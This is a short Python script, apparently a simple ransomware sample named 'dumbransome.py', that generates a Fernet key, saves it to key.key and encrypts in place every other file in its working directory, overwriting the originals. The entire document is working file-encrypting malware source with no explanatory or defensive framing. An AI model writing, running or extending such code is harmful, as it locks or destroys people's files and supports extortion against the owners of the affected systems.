import os 
from cryptography.fernet import Fernet 

allfiles = os.listdir()
files = []
for file in allfiles:
	if file != "dumbransome.py" and file != "decryptdumbrandsom.py" and file!="key.key":
		files.append(file)

key = Fernet.generate_key() 

with open("key.key","wb") as k:
	k.write(key)

def encryptFiles():
	encryptedData = []
	fernet = Fernet(key)
	for file in files:
		with open(file,"rb") as file1:
			data = file1.read()
		encryptedData.append(fernet.encrypt(data))
	for file in range(len(files)):
		with open(files[file],"wb") as file2:
			file2.write(encryptedData[file])

encryptFiles()
print("encrypted all files")